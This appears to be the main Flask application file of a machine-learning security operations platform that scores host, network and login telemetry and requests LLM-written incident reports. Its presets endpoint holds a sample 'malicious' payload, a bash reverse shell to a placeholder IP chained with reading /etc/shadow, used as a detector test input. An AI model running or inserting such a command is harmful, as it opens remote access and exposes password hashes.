"""
AI Cybersecurity Operations Center (SOC) - Flask Application
Modular, production-ready REST API for Host, Network, and Auth threat inference
with automated Groq LLM Incident Response generation.
"""

import io
import os
import sys
import logging
from flask import Flask, request, jsonify
from flask_cors import CORS
import pandas as pd

from config import Config
from services.host_service import host_service
from services.network_service import network_service
from services.auth_service import auth_service
from services.llm_service import llm_service

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(levelname)s] [%(name)s]: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
logger = logging.getLogger("soc.api")

app = Flask(__name__)
# Enable CORS for frontend Vite development server & production origins
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# ---------------------------------------------------------------------------
# Health & Status Endpoint
# ---------------------------------------------------------------------------
@app.route("/api/v1/health", methods=["GET"])
def health_check():
    """Health check endpoint providing status of artifacts and Groq LLM service."""
    artifacts_status = {
        "host_isolation_forest": Config.HOST_ISOLATION_FOREST_PATH.exists(),
        "host_scaler": Config.HOST_SCALER_PATH.exists(),
        "payload_classifier": Config.PAYLOAD_CLASSIFIER_PATH.exists(),
        "tfidf_vectorizer": Config.TFIDF_VECTORIZER_PATH.exists(),
        "network_ids_model": Config.NETWORK_IDS_MODEL_PATH.exists(),
        "network_scaler": Config.NETWORK_SCALER_PATH.exists(),
        "network_encoders": Config.NETWORK_ENCODERS_PATH.exists(),
        "auth_anomaly_model": Config.AUTH_ANOMALY_MODEL_PATH.exists(),
        "auth_scaler": Config.AUTH_SCALER_PATH.exists()
    }

    all_artifacts_present = all(artifacts_status.values())

    return jsonify({
        "status": "healthy",
        "service": "AI SOC Operations Platform",
        "version": "2.4.0",
        "all_artifacts_present": all_artifacts_present,
        "artifacts_status": artifacts_status,
        "services_fallback_mode": {
            "host_service": host_service.is_fallback_active,
            "network_service": network_service.is_fallback_active,
            "auth_service": auth_service.is_fallback_active
        },
        "llm_engine": {
            "model": Config.GROQ_MODEL,
            "groq_api_configured": bool(Config.GROQ_API_KEY and Config.GROQ_API_KEY != "YOUR_GROQ_API_KEY_HERE"),
            "groq_client_ready": llm_service.is_api_ready()
        }
    }), 200


# ---------------------------------------------------------------------------
# Module 1: Host Syscall & Payload Security (BETH)
# ---------------------------------------------------------------------------
@app.route("/api/v1/host/analyze", methods=["POST"])
def analyze_host():
    """
    Analyzes host syscall telemetry and command line payloads.
    Supports either JSON payload or multipart CSV file upload.
    Formula: Host Composite Score = (0.50 * Host Isolation Score) + (0.50 * Payload TF-IDF Threat Probability)
    """
    try:
        # Check if CSV file is uploaded
        if "file" in request.files:
            file = request.files["file"]
            if file.filename == "":
                return jsonify({"error": "No file selected"}), 400
            
            df = pd.read_csv(io.StringIO(file.read().decode("utf-8")))
            batch_result = host_service.analyze_batch(df)
            
            # If batch contains severe anomalies, generate LLM summary report on the worst record
            incident_report = None
            if batch_result.get("anomalies_detected", 0) > 0:
                top_record = max(batch_result["records"], key=lambda r: r.get("composite_score", 0.0))
                incident_report = llm_service.generate_incident_report({
                    "module": "BETH Host Syscall & Payload Security (Batch Trigger)",
                    "composite_score": top_record.get("composite_score"),
                    "risk_level": top_record.get("risk_level", "HIGH"),
                    "telemetry_summary": {
                        "processId": top_record.get("processId"),
                        "userId": top_record.get("userId"),
                        "total_anomalies_in_batch": batch_result.get("anomalies_detected")
                    }
                }, context_label="Batch CSV Host Telemetry Threat Detection")

            return jsonify({
                "mode": "batch",
                "batch_summary": batch_result,
                "incident_report": incident_report
            }), 200

        # Single JSON telemetry record
        data = request.get_json(silent=True) or {}
        result = host_service.analyze(data)

        # Trigger Automated Groq LLM Incident Report if Composite Score >= 0.65 or anomaly detected
        incident_report = None
        if llm_service.should_trigger_report(result):
            logger.info("Host anomaly threshold crossed (Score: %s). Generating Groq Incident Report...", result['composite_score'])
            incident_report = llm_service.generate_incident_report(result, context_label="BETH Host Telemetry Anomaly")

        result["incident_report"] = incident_report
        return jsonify(result), 200

    except Exception as e:
        logger.exception("Error in /api/v1/host/analyze: %s", e)
        return jsonify({"error": str(e), "message": "Failed to analyze host telemetry"}), 500


# ---------------------------------------------------------------------------
# Module 2: Network Intrusion Inspector (NSL-KDD)
# ---------------------------------------------------------------------------
@app.route("/api/v1/network/analyze", methods=["POST"])
def analyze_network():
    """
    Analyzes network flow metrics and classifies attacks (DoS, Probe, R2L, U2R).
    Supports either JSON payload or multipart CSV file upload.
    Network Threat Probability = Random Forest predict_proba()
    """
    try:
        # Check if CSV file is uploaded
        if "file" in request.files:
            file = request.files["file"]
            if file.filename == "":
                return jsonify({"error": "No file selected"}), 400

            df = pd.read_csv(io.StringIO(file.read().decode("utf-8")))
            batch_result = network_service.analyze_batch(df)

            incident_report = None
            if batch_result.get("threats_detected", 0) > 0:
                top_record = max(batch_result["records"], key=lambda r: r.get("threat_probability", 0.0))
                incident_report = llm_service.generate_incident_report({
                    "module": "NSL-KDD Network Intrusion Inspector (Batch Trigger)",
                    "threat_probability": top_record.get("threat_probability"),
                    "attack_category": top_record.get("attack_category"),
                    "risk_level": top_record.get("risk_level", "HIGH"),
                    "telemetry_summary": {
                        "protocol_type": top_record.get("protocol"),
                        "service": top_record.get("service"),
                        "flag": top_record.get("flag")
                    }
                }, context_label="Batch Network Flow Intrusion Alert")

            return jsonify({
                "mode": "batch",
                "batch_summary": batch_result,
                "incident_report": incident_report
            }), 200

        # Single JSON flow record
        data = request.get_json(silent=True) or {}
        result = network_service.analyze(data)

        # Trigger Groq LLM Incident Report if Network Threat == 1 or prob >= 0.50
        incident_report = None
        if llm_service.should_trigger_report(result):
            logger.info("Network threat detected (Prob: %s, Category: %s). Generating Groq Incident Report...",
                        result['threat_probability'], result['attack_category'])
            incident_report = llm_service.generate_incident_report(result, context_label="NSL-KDD Network Intrusion Detection")

        result["incident_report"] = incident_report
        return jsonify(result), 200

    except Exception as e:
        logger.exception("Error in /api/v1/network/analyze: %s", e)
        return jsonify({"error": str(e), "message": "Failed to analyze network flow telemetry"}), 500


# ---------------------------------------------------------------------------
# Module 3: Auth & Insider Threat Engine (CERT)
# ---------------------------------------------------------------------------
@app.route("/api/v1/auth/analyze", methods=["POST"])
def analyze_auth():
    """
    Analyzes authentication schedules and user behavioral anomalies using Isolation Forest.
    Supports either JSON payload or multipart CSV file upload.
    Auth Anomaly Score = Isolation Forest decision function score
    """
    try:
        # Check if CSV file is uploaded
        if "file" in request.files:
            file = request.files["file"]
            if file.filename == "":
                return jsonify({"error": "No file selected"}), 400

            df = pd.read_csv(io.StringIO(file.read().decode("utf-8")))
            batch_result = auth_service.analyze_batch(df)

            incident_report = None
            if batch_result.get("anomalies_detected", 0) > 0:
                top_record = max(batch_result["records"], key=lambda r: r.get("anomaly_score", 0.0))
                incident_report = llm_service.generate_incident_report({
                    "module": "CERT Auth & Insider Threat Engine (Batch Trigger)",
                    "user_id": top_record.get("user_id"),
                    "anomaly_score": top_record.get("anomaly_score"),
                    "risk_level": top_record.get("risk_level", "HIGH"),
                    "telemetry_summary": {
                        "user_id": top_record.get("user_id"),
                        "login_hour": top_record.get("login_hour"),
                        "failed_logins": top_record.get("failed_logins")
                    }
                }, context_label="Batch CERT Auth Anomaly Alert")

            return jsonify({
                "mode": "batch",
                "batch_summary": batch_result,
                "incident_report": incident_report
            }), 200

        # Single JSON telemetry record
        data = request.get_json(silent=True) or {}
        result = auth_service.analyze(data)

        # Trigger Groq LLM Incident Report if Auth Anomaly == -1 or score >= 0.65
        incident_report = None
        if llm_service.should_trigger_report(result):
            logger.info("Auth anomaly detected for user %s (Score: %s). Generating Groq Incident Report...",
                        result.get('user_id'), result['anomaly_score'])
            incident_report = llm_service.generate_incident_report(result, context_label="CERT Insider Threat Anomaly")

        result["incident_report"] = incident_report
        return jsonify(result), 200

    except Exception as e:
        logger.exception("Error in /api/v1/auth/analyze: %s", e)
        return jsonify({"error": str(e), "message": "Failed to analyze authentication telemetry"}), 500


# ---------------------------------------------------------------------------
# Direct Incident Report Generator Endpoint
# ---------------------------------------------------------------------------
@app.route("/api/v1/incident/report", methods=["POST"])
def generate_custom_incident_report():
    """Generates an on-demand SOC Incident Response Report via Groq for custom security telemetry."""
    try:
        data = request.get_json(silent=True) or {}
        context = data.get("context", "SOC Analyst On-Demand Investigation")
        threat_data = data.get("threat_data", data)
        report = llm_service.generate_incident_report(threat_data, context_label=context)
        return jsonify(report), 200
    except Exception as e:
        logger.exception("Error generating incident report: %s", e)
        return jsonify({"error": str(e), "message": "Failed to generate incident report"}), 500


# ---------------------------------------------------------------------------
# Default Presets Endpoint
# ---------------------------------------------------------------------------
@app.route("/api/v1/presets", methods=["GET"])
def get_presets():
    """Provides realistic default logs for testing all modules."""
    return jsonify({
        "host": {
            "benign": {
                "processId": 2481,
                "parentProcessId": 1204,
                "userId": 1000,
                "mountNamespace": 4026531840,
                "eventId": 59,
                "argsNum": 2,
                "returnValue": 0,
                "suspendCount": 0,
                "payload_text": "python3 /opt/monitoring/health_check.py --interval=60"
            },
            "malicious": {
                "processId": 8942,
                "parentProcessId": 1,
                "userId": 0,
                "mountNamespace": 4026531840,
                "eventId": 157,
                "argsNum": 6,
                "returnValue": -1,
                "suspendCount": 2,
                "payload_text": "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1 && sudo cat /etc/shadow"
            }
        },
        "network": {
            "benign": {
                "protocol_type": "tcp",
                "service": "http",
                "flag": "SF",
                "src_bytes": 284,
                "dst_bytes": 3812,
                "count": 4,
                "srv_count": 4,
                "serror_rate": 0.0,
                "rerror_rate": 0.0,
                "same_srv_rate": 1.0,
                "diff_srv_rate": 0.0
            },
            "malicious_syn_flood": {
                "protocol_type": "tcp",
                "service": "private",
                "flag": "S0",
                "src_bytes": 0,
                "dst_bytes": 0,
                "count": 280,
                "srv_count": 280,
                "serror_rate": 1.0,
                "rerror_rate": 0.0,
                "same_srv_rate": 1.0,
                "diff_srv_rate": 0.0
            }
        },
        "auth": {
            "benign": {
                "user_id": "USR-1042",
                "login_hour": 10,
                "is_weekend": 0,
                "failed_logins": 0,
                "usb_device_connected": 0,
                "files_accessed": 18,
                "data_transfer_mb": 8.5,
                "privileged_commands_count": 0
            },
            "malicious": {
                "user_id": "USR-8819",
                "login_hour": 3,
                "is_weekend": 1,
                "failed_logins": 6,
                "usb_device_connected": 1,
                "files_accessed": 420,
                "data_transfer_mb": 780.0,
                "privileged_commands_count": 5
            }
        }
    }), 200


if __name__ == "__main__":
    logger.info("Starting AI SOC Operations Platform on %s:%s", Config.HOST, Config.PORT)
    app.run(host=Config.HOST, port=Config.PORT, debug=Config.DEBUG)

